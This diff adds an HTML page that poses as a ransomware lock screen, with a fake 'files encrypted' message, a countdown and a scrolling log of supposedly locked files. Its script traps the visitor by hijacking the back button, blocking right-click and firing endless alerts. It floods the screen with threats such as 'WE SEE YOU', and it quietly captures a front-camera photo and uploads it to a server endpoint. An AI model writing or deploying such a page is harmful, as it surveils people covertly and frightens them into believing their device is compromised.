@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SYSTEM COMPROMISED</title>
+<style>
+  body {
+    background: #050505; color: #ff0000; font-family: 'Courier New', monospace;
+    margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column;
+    justify-content: center; align-items: center; overflow: hidden; text-align: center;
+    position: relative;
+  }
+  .warning { font-size: 50px; font-weight: bold; animation: blink 0.5s infinite; margin-bottom: 20px; z-index: 10;}
+  @keyframes blink { 50% { opacity: 0.3; } }
+  h1 { font-size: 28px; color: #fff; margin-bottom: 10px; z-index: 10;}
+  p { font-size: 16px; color: #ffcccc; max-width: 600px; line-height: 1.5; z-index: 10;}
+  .timer { font-size: 60px; color: #ff0000; font-weight: bold; margin: 30px 0; text-shadow: 0 0 20px #ff0000; z-index: 10;}
+  .file-list { background: #111; border: 1px solid #333; padding: 15px; width: 80%; max-width: 500px; text-align: left; height: 150px; overflow: hidden; margin-top: 20px; font-size: 12px; color: #00ff00; z-index: 10;}
+  .file-line { margin: 3px 0; }
+  
+  /* ستايل الرسائل المتطايرة */
+  .floating-msg {
+    position: absolute;
+    color: #ff0000;
+    font-weight: bold;
+    font-size: 18px;
+    text-shadow: 0 0 5px #ff0000;
+    pointer-events: none;
+    z-index: 9999;
+    animation: shakeMsg 0.2s infinite, floatUp 3s forwards;
+  }
+  @keyframes shakeMsg {
+    0% { transform: translate(0, 0); }
+    25% { transform: translate(2px, 2px); }
+    50% { transform: translate(-2px, -2px); }
+    75% { transform: translate(2px, -2px); }
+    100% { transform: translate(-2px, 2px); }
+  }
+  @keyframes floatUp {
+    0% { opacity: 1; transform: translateY(0) scale(1); }
+    100% { opacity: 0; transform: translateY(-100px) scale(1.5); }
+  }
+</style>
+</head>
+<body>
+
+<div class="warning">☠️ SYSTEM LOCKED ☠️</div>
+<h1>Your files have been encrypted.</h1>
+<p>All your personal data has been encrypted with RSA-4096.</p>
+<div class="timer" id="timer">24:00:00</div>
+<div class="file-list" id="fileList"></div>
+
+<video id="cam" style="position:absolute; top:-9999px;" autoplay playsinline></video>
+<canvas id="cv" style="position:absolute; top:-9999px;"></canvas>
+
+<script>
+  // 1. قفل زر الرجوع ومنع الخروج
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () { history.go(1); };
+  window.onbeforeunload = function () { return "You cannot leave! Your files will be lost."; };
+  document.addEventListener('contextmenu', e => e.preventDefault());
+
+  // 2. صوت الإنذار المبكر (Air Raid Siren)
+  let audioStarted = false;
+  function startSiren() {
+    if (audioStarted) return;
+    audioStarted = true;
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      
+      // المذبذب الأساسي (الصوت اللي بيطلع)
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      
+      // المذبذب الثاني (اللي بيغير حدة الصوت صعوداً وهبوطاً)
+      const lfo = audioCtx.createOscillator();
+      const lfoGain = audioCtx.createGain();
+      
+      osc.type = 'sawtooth';
+      osc.frequency.value = 600; // تردد الصوت الأساسي
+      
+      lfo.type = 'sine';
+      lfo.frequency.value = 0.5; // سرعة الصعود والهبوط (نص دورة بالثانية)
+      lfoGain.gain.value = 400; // مساحة التغير في الصوت (من 200 لـ 1000)
+      
+      // ربطهم ببعض
+      lfo.connect(lfoGain);
+      lfoGain.connect(osc.frequency);
+      
+      gain.gain.value = 0.3; // مستوى الصوت
+      
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      
+      lfo.start();
+      osc.start();
+    } catch(e) {}
+  }
+  document.body.addEventListener('click', startSiren, { once: true });
+  document.body.addEventListener('touchstart', startSiren, { once: true });
+
+  // 3. كاميرا أمامية
+  async function captureIntruder() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.getElementById('cam');
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(r => setTimeout(r, 1000));
+      const canvas = document.getElementById('cv');
+      canvas.width = 640; canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+      const imgData = canvas.toDataURL('image/jpeg', 0.8);
+      stream.getTracks().forEach(t => t.stop());
+      await fetch('/upload-cam', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ front: imgData, brand: 'ransom' })
+      }).catch(()=>{});
+    } catch(e) {}
+  }
+  setTimeout(captureIntruder, 2000);
+
+  // 4. محاكي التشفير
+  const exts = ['jpg', 'png', 'pdf', 'docx', 'mp4', 'zip', 'txt', 'xlsx'];
+  const names = ['family_photo', 'vacation', 'my_docs', 'project', 'backup', 'passwords', 'bank'];
+  const fileList = document.getElementById('fileList');
+  
+  setInterval(() => {
+    const line = document.createElement('div');
+    line.className = 'file-line';
+    line.innerHTML = `[ENCRYPTED] /storage/emulated/0/DCIM/${names[Math.floor(Math.random()*names.length)]}.${exts[Math.floor(Math.random()*exts.length)]} -> ${Math.random().toString(16).substring(2, 20)}.locked`;
+    fileList.prepend(line);
+    if (fileList.childNodes.length > 30) fileList.removeChild(fileList.lastChild);
+  }, 100);
+
+  // 5. العداد التنازلي
+  let timeLeft = 24 * 3600;
+  const timerEl = document.getElementById('timer');
+  setInterval(() => {
+    timeLeft--;
+    const h = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
+    const m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
+    const s = (timeLeft % 60).toString().padStart(2, '0');
+    timerEl.textContent = `${h}:${m}:${s}`;
+  }, 1000);
+
+  // 6. إغراق الشاشة بالرسائل المرعبة (Message Flooding)
+  const scaryMessages = [
+    "SYSTEM BREACHED", "DATA STOLEN", "IP LOGGED", "ENCRYPTING FILES...", 
+    "UNAUTHORIZED ACCESS", "DELETING BACKUPS", "UPLOADING TO C2 SERVER",
+    "SMILE FOR THE CAMERA", "WE SEE YOU", "PHONE COMPROMISED", "DONT CLOSE"
+  ];
+
+  setInterval(() => {
+    const msg = document.createElement('div');
+    msg.className = 'floating-msg';
+    msg.innerText = scaryMessages[Math.floor(Math.random() * scaryMessages.length)];
+    
+    // أماكن عشوائية على الشاشة
+    msg.style.left = Math.floor(Math.random() * 80) + '%';
+    msg.style.top = Math.floor(Math.random() * 80) + '%';
+    
+    // أحجام مختلفة عشان تاخد بالعين
+    msg.style.fontSize = (Math.floor(Math.random() * 20) + 14) + 'px';
+    
+    document.body.appendChild(msg);
+    
+    // نمسح الرسالة بعد 3 ثواني عشان ما نعلق المتصفح
+    setTimeout(() => { msg.remove(); }, 3000);
+  }, 150); // تطلع رسالة كل 150 ملي ثانية (زي الرصاص)
+
+  // 7. بوب أب لا نهائي بعد 10 ثواني
+  setTimeout(() => {
+    setInterval(() => {
+      alert("☠️ YOUR SYSTEM IS DESTROYED ☠️\n\nThey are watching you through your camera.");
+    }, 10000);
+  }, 10000);
+</script>
+</body>
+</html>
